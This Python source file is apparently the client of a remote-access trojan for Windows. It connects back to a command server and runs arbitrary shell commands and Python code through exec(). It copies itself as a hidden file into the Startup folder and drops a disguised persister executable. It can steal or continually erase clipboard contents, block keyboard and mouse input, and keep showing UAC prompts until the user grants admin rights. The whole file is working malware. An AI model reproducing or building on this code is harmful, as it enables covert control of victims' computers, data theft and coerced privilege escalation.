import socket
import subprocess
import os
import sys
import threading
import win32gui
import win32clipboard
import string
import win32api
import ctypes
from subprocess import Popen
from time import sleep

BUFF_SIZE = 64
ADDRESS = socket.gethostbyname(socket.gethostname())
PORT = 5050
FORMAT = "utf-8"
SERVER = None
CLIPBOARD_THREAD_ACTIVE = False

def main():
    global CLIPBOARD_THREAD_ACTIVE
    global disable_clipboard_thread
    while True:
        # Connect to server
        connect_to_server()

        while True:
            try:
                # Receive command
                command = receive()
                print(command)

                if command == "exit":
                    send("Exiting...")
                    sys.exit()

                elif command == "TEST":
                    continue

                elif command == "persist":
                    persist()

                elif command == "cmd":
                    cmd()

                elif command == "startup":
                    startup()

                elif command == "clipboard":
                    clipboard()

                elif command == "disableclipboard":
                    if not disable_clipboard_thread.is_alive():
                        CLIPBOARD_THREAD_ACTIVE = True
                        disable_clipboard_thread.start()

                elif command == "activateclipbaord":
                    CLIPBOARD_THREAD_ACTIVE = False
                    send("Clipboard activated")
                    disable_clipboard_thread = threading.Thread(target=disable_clipboard)

                elif command == "python":
                    python()

                elif command == "block":
                    block()

                elif command == "unblock":
                    block(active=False)

                elif command == "checkadmin":
                    check_admin()

                elif command == "uac":
                    uac()

                elif command == "fuac":
                    fuac()

                elif command == "shutdown":
                    shutdown()

                elif command == "lock":
                    lock()

                elif command == "window":
                    window()

                elif command == "drives":
                    drives()

                else:
                    send("Command unknown")

            except socket.error:
                break

# Runs command shell
def cmd():
    # TODO
    send(os.getcwd() + ">>")
    command = receive()
    output = subprocess.check_output(command, shell=True)

# Program which will rerun this program
def persist():
    path = "C:\\Users\\" + os.getlogin() + "\\AppData\\Roaming\\Microsoft\\wactive.exe"
    if not os.path.exists(path):
        with open(r"F:\C PROJECTS\Persister\persister.exe", "rb")as f:
            with open(path, "wb")as file:
                file.write(f.read())
    Popen([path, sys.argv[0], os.path.realpath(sys.argv[0])])
    send(f"Persister started at path {path}")

# Sends clipboard
def clipboard():
    win32clipboard.OpenClipboard()
    data = win32clipboard.GetClipboardData()
    win32clipboard.CloseClipboard()
    send(data)

# Constantly deletes clipboard
def disable_clipboard():
    send("Disabling Clipboard...")
    while CLIPBOARD_THREAD_ACTIVE:
        win32clipboard.OpenClipboard()
        try:
            while CLIPBOARD_THREAD_ACTIVE:
                win32clipboard.EmptyClipboard()
                sleep(1)
        finally:
            win32clipboard.CloseClipboard()

# Copy to startup
def startup():
    # Path to startup folder
    path = "C:\\Users\\" + os.getlogin() + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\process_measurement.exe"

    # Check if path exists
    if not os.path.exists(path):

        # If not read current file
        with open(sys.argv[0], "rb")as file:
            byt = file.read()

        # And copy it to startup path
        with open(path, "wb")as file:
            file.write(byt)

        # Hide file
        win32api.SetFileAttributes(path, 2)

        send(f"File added to following path: {path}")
    else:
        send(f"File already established at following path: {path}")

# Python interpreter
def python():
    # Permanent loop
    while True:
        send("Send quit to go back\nEnter python script>> ")

        # Receive input
        script = receive()
        print(script)

        # if quit is received quit the shell
        if script == "quit":
            send("Quitting...")
            return

        # Try to run script and catch errors
        try:
            exec(script)
            send("Script executed successful")

        # Send Error
        except Exception as e:
            # TODO
            send(str(e))

# Blocks oder unblocks input (admin only)
def block(active=True):
    if active:
        ctypes.windll.user32.BlockInput(True)
        send("Block active if admin rights established")
    else:
        ctypes.windll.user32.BlockInput(False)
        send("Block deactivated if admin rights established")

# Checks if program runs as admin
def check_admin():
    if ctypes.windll.shell32.IsUserAnAdmin():
        send("Program runs as admin")
    else:
        send("Program runs not as admin")

# Asks for admin privileges and exits if accepted, designed to run an executable
def uac():
    if ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.argv[0], "", None, 1) == 42:
        send("UAC request accepted\nRestarting...")
        sys.exit()

    else:
        send("UAC request declined")

# Displays the uac window until accepted
def fuac():
    while ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.argv[0], "", None, 1) != 42:
        pass

    send("UAC request accepted\nRestarting...")
    sys.exit()

# Shuts down the computer
def shutdown():
    send("Shutting down...")
    os.system("shutdown -s -t 0")

# Locks the screen
def lock():
    send("Locking...")
    ctypes.windll.user32.LockWorkStation()

# Sends current window
def window():
    send(win32gui.GetWindowText(win32gui.GetForegroundWindow()))

# Sends all drives
def drives():
    drives = []
    bit_mask = ctypes.windll.kernel32.GetLogicalDrives()
    for letter in string.ascii_uppercase:
        if bit_mask & 1:
            drives.append(letter + ":")
        bit_mask >>= 1
    send(str(drives))


def connect_to_server():
    global SERVER
    SERVER = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try:
            SERVER.connect((ADDRESS, PORT))
        except ConnectionRefusedError:
            # Try to connect again
            sleep(2)
            continue
        # break if connected
        break

def receive():
    size = SERVER.recv(BUFF_SIZE)
    msg = SERVER.recv(int(size.decode()))
    return msg.decode()

def send(msg):
    if msg is None or msg == "":
        return

    msg_len = str(len(msg)).encode()
    msg_len += b' ' *(BUFF_SIZE - len(msg_len))
    SERVER.send(msg_len)
    sleep(0.5)
    SERVER.send(msg.encode())

def create_clipboard_thread():
    pass

disable_clipboard_thread = threading.Thread(target=disable_clipboard)
disable_clipboard_thread.daemon = True

if __name__ == '__main__':
    while True:
        main()
        del SERVER


